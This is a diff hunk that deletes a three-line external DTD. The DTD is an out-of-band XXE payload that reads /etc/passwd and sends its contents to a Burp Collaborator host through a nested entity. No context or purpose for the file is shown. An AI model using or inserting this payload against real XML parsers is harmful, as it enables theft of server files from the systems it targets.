@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % all "<!ENTITY send SYSTEM 'data://4kpppdihhx7c7w774wxwnvtfk6q2er.burpcollaborator.net:80/%file;'>">
-%all;
